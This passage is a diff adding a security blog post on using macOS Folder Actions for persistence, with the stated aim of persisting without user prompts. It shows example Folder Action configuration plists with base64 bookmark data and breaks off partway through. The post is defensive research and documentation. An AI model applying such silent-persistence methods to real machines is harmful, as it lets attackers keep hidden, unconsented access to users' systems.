@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Csaba Fitzl">
+    
+    
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Beyond the good ol&#39; LaunchAgents - 24 - Folder Actions"/>
+<meta name="twitter:description" content="This is part 24 in the series of &ldquo;Beyond the good ol&#39; LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the introduction.
+ Folder action persistence has been documented by Cody Thomas back in 2019 in his blog. I think he did an awesome job, and everything he wrote still applies today. I wanted to take it a bit further and see if I can persist without any user prompts, and it turned out it is possible."/>
+
+    <meta property="og:title" content="Beyond the good ol&#39; LaunchAgents - 24 - Folder Actions" />
+<meta property="og:description" content="This is part 24 in the series of &ldquo;Beyond the good ol&#39; LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the introduction.
+ Folder action persistence has been documented by Cody Thomas back in 2019 in his blog. I think he did an awesome job, and everything he wrote still applies today. I wanted to take it a bit further and see if I can persist without any user prompts, and it turned out it is possible." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://theevilbit.github.io/beyond/beyond_0024/" /><meta property="article:section" content="beyond" />
+<meta property="article:published_time" content="2021-12-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-12-02T00:00:00+00:00" />
+
+
+
+    
+      <base href="https://theevilbit.github.io/beyond/beyond_0024/">
+    
+    <title>
+  Beyond the good ol&#39; LaunchAgents - 24 - Folder Actions · theevilbit blog
+</title>
+
+    
+      <link rel="canonical" href="https://theevilbit.github.io/beyond/beyond_0024/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.28d751104f30c16da1aa1bb04015cbe662cacfe0d1b01af4f2240ad58580069c.css" integrity="sha256-KNdREE8wwW2hqhuwQBXL5mLKz&#43;DRsBr08iQK1YWABpw=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+    
+    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.89.2" />
+  </head>
+
+  <body class=" ">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://theevilbit.github.io/">
+      theevilbit blog
+    </a>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/posts/">Posts</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/shield/">Shield.app</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/tags/">Tags</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/categories/">Categories</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/about/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Beyond the good ol&#39; LaunchAgents - 24 - Folder Actions</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2021-12-02T00:00:00Z'>
+                December 2, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              6 minutes read
+            </span>
+          </div>
+          <div class="categories">
+  <i class="fas fa-folder"></i>
+    <a href="https://theevilbit.github.io/categories/persistence/">persistence</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/categories/beyond/">beyond</a></div>
+
+          <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="https://theevilbit.github.io/tags/macos/">macos</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/persistence/">persistence</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/beyond/">beyond</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        <blockquote>
+<p>This is part 24 in the series of &ldquo;Beyond the good ol' LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the <a href="https://theevilbit.github.io/beyond/beyond_intro/">introduction</a>.</p>
+</blockquote>
+<p>Folder action persistence has been documented by <a href="https://twitter.com/its_a_feature_">Cody Thomas</a> back in 2019 <a href="https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d">in his blog</a>. I think he did an awesome job, and everything he wrote still applies today. I wanted to take it a bit further and see if I can persist without any user prompts, and it turned out it is possible. I will also talk about its TCC implications.</p>
+<h2 id="the-tldr">The TL;DR</h2>
+<p>Folder Actions are documented by Apple in their developer documentation: <a href="https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/WatchFolders.html">Mac Automation Scripting Guide: Watching Folders</a>. Basically these are scripts that the system will run when files are added or deleted from the watched folder in Finder or the folder&rsquo;s window is opened, closed or resized. (If we perform the same actions in shell nothing happens).</p>
+<p>We can add such scripts via Finder, but that requires extensive user actions or by Apple Scripts, but that one also generates quite a few prompts. Let&rsquo;s explore how we can bypass the user and persist without any popup.</p>
+<h2 id="creating-folder-actions">Creating Folder Actions</h2>
+<p>As described by Cody the default location for the scripts is <code>/Library/Scripts/Folder Action Scripts</code> and <code>~/Library/Scripts/Folder Action Scripts</code>. The other important item he described is that the action script configuration can be found in the file <code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code>. This PLIST contains even more embedded PLISTs in base64 encoded format.</p>
+<p>Let&rsquo;s start by creating a Folder Action through the GUI, for a folder <code>~/test</code> and attach the script <code>~/Library/Scripts/Folder Action Scripts/folderaction.scpt</code>. This is what we get as a result.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>folderActions<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
+	YnBsaXN0MDDUAQIDBAUGBwpYJHZlcnNpb25ZJGFyY2hpdmVyVCR0b3BYJG9iamVjdHMS
+	AAGGoF8QD05TS2V5ZWRBcmNoaXZlctEICVRyb290gAGuCwwSHh8gISQrLzQ1NjpVJG51
+	bGzSDQ4PEVpOUy5vYmplY3RzViRjbGFzc6EQgAKAB9YTFBUWFw4YGRobHB1YYm9va21h
+	cmtXZW5hYmxlZF1wcmlvckNvbnRlbnRzVG5hbWVXc2NyaXB0c4ADgAWABoAEgAiADU8R
+	A2Bib29rYAMAAAAABBAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQ
+	AgAABAAAAAMDAAAAAgAABQAAAAEBAABVc2VycwAAAAUAAAABAQAAY3NhYnkAAAAEAAAA
+	AQEAAHRlc3QMAAAAAQYAABAAAAAgAAAAMAAAAAgAAAAEAwAAQ10AAAMAAAAIAAAABAMA
+	AE2ZAAADAAAACAAAAAQDAACpGgYAAwAAAAwAAAABBgAAUAAAAGAAAABwAAAACAAAAAAE
+	AABBw6vM+VIwNxgAAAABAgAAAgAAAAAAAAAPAAAAAAAAAAAAAAAAAAAACAAAAAQDAAAB
+	AAAAAAAAAAQAAAADAwAA9QEAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1hY2ludG9z
+	aCBIRAgAAAAEAwAAAJAvUAkAAAAIAAAAAAQAAEHDjpDvAAAAJAAAAAEBAAAwQTgxRjNC
+	MS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAAAQIAAIEAAAABAAAA7xMAAAEA
+	AAAAAAAAAAAAAAEAAAABAQAALwAAAAAAAAABBQAAwwAAAAECAAA0MmMxMGVlZjZiNTNi
+	ZTcwMWI2NjZhMTM4M2E3YmQwMWQ1YjE4NzA0ODUxMzRhMDViMDFhZTU2YzYyOTcwZTkw
+	OzAwOzAwMDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwMDAwMDAwMjA7Y29t
+	LmFwcGxlLmFwcC1zYW5kYm94LnJlYWQtd3JpdGU7MDE7MDEwMDAwMDY7MDAwMDAwMDMw
+	MDA2MWFhOTswMTsvdXNlcnMvY3NhYnkvdGVzdAAA2AAAAP7///8BAAAAAAAAABEAAAAE
+	EAAAPAAAAAAAAAAFEAAAgAAAAAAAAAAQEAAApAAAAAAAAABAEAAAlAAAAAAAAAACIAAA
+	cAEAAAAAAAAFIAAA4AAAAAAAAAAQIAAA8AAAAAAAAAARIAAAJAEAAAAAAAASIAAABAEA
+	AAAAAAATIAAAFAEAAAAAAAAgIAAAUAEAAAAAAAAwIAAAfAEAAAAAAAABwAAAxAAAAAAA
+	AAARwAAAIAAAAAAAAAASwAAA1AAAAAAAAAAQ0AAABAAAAAAAAACA8AAAhAEAAAAAAABU
+	dGVzdAnSDQ4iEaCAB9IlJicoWiRjbGFzc25hbWVYJGNsYXNzZXNeTlNNdXRhYmxlQXJy
+	YXmjJykqV05TQXJyYXlYTlNPYmplY3TSDQ4sEaEtgAmAB9QTFBYOMBkyM4AKgAWAC4AM
+	TxEELGJvb2ssBAAAAAAEEDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	ABwDAAAEAAAAAwMAAAACAAAFAAAAAQEAAFVzZXJzAAAABQAAAAEBAABjc2FieQAAAAcA
+	AAABAQAATGlicmFyeQAHAAAAAQEAAFNjcmlwdHMAFQAAAAEBAABGb2xkZXIgQWN0aW9u
+	IFNjcmlwdHMAAAARAAAAAQEAAGZvbGRlcmFjdGlvbi5zY3B0AAAAGAAAAAEGAAAQAAAA
+	IAAAADAAAABAAAAAUAAAAHAAAAAIAAAABAMAAENdAAADAAAACAAAAAQDAABNmQAAAwAA
+	AAgAAAAEAwAAVZkAAAMAAAAIAAAABAMAAJ8dBgADAAAACAAAAAQDAACgHQYAAwAAAAgA
+	AAAEAwAArR0GAAMAAAAYAAAAAQYAAKwAAAC8AAAAzAAAANwAAADsAAAA/AAAAAgAAAAA
+	BAAAQcOrziIIAWgYAAAAAQIAAAEAAAAAAAAADwAAAAAAAAAAAAAAAAAAAAgAAAAEAwAA
+	BAAAAAAAAAAEAAAAAwMAAPUBAAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRv
+	c2ggSEQIAAAABAMAAACQL1AJAAAACAAAAAAEAABBw46Q7wAAACQAAAABAQAAMEE4MUYz
+	QjEtNTFEOS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAAB
+	AAAAAAAAAAAAAAABAAAAAQEAAC8AAAAAAAAAAQUAAPYAAAABAgAAMDk0YmQ1NjJiMGUw
+	MmFkNmQ5ODg3YTY3YWRkYTA0YzRlNzg0ZWViNGZiYWE1MjhkYzA0M2Y4YTU0OGU3NTA0
+	MjswMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDAwMDAwMDIwO2Nv
+	bS5hcHBsZS5hcHAtc2FuZGJveC5yZWFkLXdyaXRlOzAxOzAxMDAwMDA2OzAwMDAwMDAz
+	MDAwNjFkYWQ7MDE7L3VzZXJzL2NzYWJ5L2xpYnJhcnkvc2NyaXB0cy9mb2xkZXIgYWN0
+	aW9uIHNjcmlwdHMvZm9sZGVyYWN0aW9uLnNjcHQAAADYAAAA/v///wEAAAAAAAAAEQAA
+	AAQQAACMAAAAAAAAAAUQAAAMAQAAAAAAABAQAAA8AQAAAAAAAEAQAAAsAQAAAAAAAAIg
+	AAAIAgAAAAAAAAUgAAB4AQAAAAAAABAgAACIAQAAAAAAABEgAAC8AQAAAAAAABIgAACc
+	AQAAAAAAABMgAACsAQAAAAAAACAgAADoAQAAAAAAADAgAAAUAgAAAAAAAAHAAABcAQAA
+	AAAAABHAAAAgAAAAAAAAABLAAABsAQAAAAAAABDQAAAEAAAAAAAAAIDwAAAcAgAAAAAA
+	AF8QEWZvbGRlcmFjdGlvbi5zY3B00iUmNzheSW50ZXJuYWxTY3JpcHSiOSpeSW50ZXJu
+	YWxTY3JpcHTSJSY7PF8QFEludGVybmFsRm9sZGVyQWN0aW9uoj0qXxAUSW50ZXJuYWxG
+	b2xkZXJBY3Rpb24ACAARABoAJAApADIANwBJAEwAUQBTAGIAaABtAHgAfwCBAIMAhQCS
+	AJsAowCxALYAvgDAAMIAxADGAMgAygQuBDMENAQ5BDoEPARBBEwEVQRkBGgEcAR5BH4E
+	gASCBIQEjQSPBJEEkwSVCMUI2QjeCO0I8Aj/CQQJGwkeAAAAAAAAAgEAAAAAAAAAPgAA
+	AAAAAAAAAAAAAAAACTU=
+	<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>folderActionsEnabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
+</code></pre></div><p>This is not too informative. We can decode the base64 data, and get a binary plist. If we convert it to XML we get the following.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$archiver<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSKeyedArchiver<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>$null<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+					<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+					<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>2<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>13<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>bookmark<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>3<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>enabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>5<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>name<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>4<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>priorContents<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>6<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>scripts<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>8<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
+		Ym9va2ADAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+		AAAAUAIAAAQAAAADAwAAAAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGNz
+		YWJ5AAAABAAAAAEBAAB0ZXN0DAAAAAEGAAAQAAAAIAAAADAAAAAIAAAABAMA
+		AENdAAADAAAACAAAAAQDAABNmQAAAwAAAAgAAAAEAwAAqRoGAAMAAAAMAAAA
+		AQYAAFAAAABgAAAAcAAAAAgAAAAABAAAQcOrzPlSMDcYAAAAAQIAAAIAAAAA
+		AAAADwAAAAAAAAAAAAAAAAAAAAgAAAAEAwAAAQAAAAAAAAAEAAAAAwMAAPUB
+		AAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRvc2ggSEQIAAAABAMA
+		AACQL1AJAAAACAAAAAAEAABBw46Q7wAAACQAAAABAQAAMEE4MUYzQjEtNTFE
+		OS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAAB
+		AAAAAAAAAAAAAAABAAAAAQEAAC8AAAAAAAAAAQUAAMMAAAABAgAANDJjMTBl
+		ZWY2YjUzYmU3MDFiNjY2YTEzODNhN2JkMDFkNWIxODcwNDg1MTM0YTA1YjAx
+		YWU1NmM2Mjk3MGU5MDswMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDsw
+		MDAwMDAwMDAwMDAwMDIwO2NvbS5hcHBsZS5hcHAtc2FuZGJveC5yZWFkLXdy
+		aXRlOzAxOzAxMDAwMDA2OzAwMDAwMDAzMDAwNjFhYTk7MDE7L3VzZXJzL2Nz
+		YWJ5L3Rlc3QAANgAAAD+////AQAAAAAAAAARAAAABBAAADwAAAAAAAAABRAA
+		AIAAAAAAAAAAEBAAAKQAAAAAAAAAQBAAAJQAAAAAAAAAAiAAAHABAAAAAAAA
+		BSAAAOAAAAAAAAAAECAAAPAAAAAAAAAAESAAACQBAAAAAAAAEiAAAAQBAAAA
+		AAAAEyAAABQBAAAAAAAAICAAAFABAAAAAAAAMCAAAHwBAAAAAAAAAcAAAMQA
+		AAAAAAAAEcAAACAAAAAAAAAAEsAAANQAAAAAAAAAENAAAAQAAAAAAAAAgPAA
+		AIQBAAAAAAAA
+		<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>test<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;array/&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSMutableArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSMutableArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+					<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+					<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>9<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>12<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>bookmark<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>10<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>enabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>5<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>name<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>11<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
+		Ym9vaywEAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+		AAAAHAMAAAQAAAADAwAAAAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGNz
+		YWJ5AAAABwAAAAEBAABMaWJyYXJ5AAcAAAABAQAAU2NyaXB0cwAVAAAAAQEA
+		AEZvbGRlciBBY3Rpb24gU2NyaXB0cwAAABEAAAABAQAAZm9sZGVyYWN0aW9u
+		LnNjcHQAAAAYAAAAAQYAABAAAAAgAAAAMAAAAEAAAABQAAAAcAAAAAgAAAAE
+		AwAAQ10AAAMAAAAIAAAABAMAAE2ZAAADAAAACAAAAAQDAABVmQAAAwAAAAgA
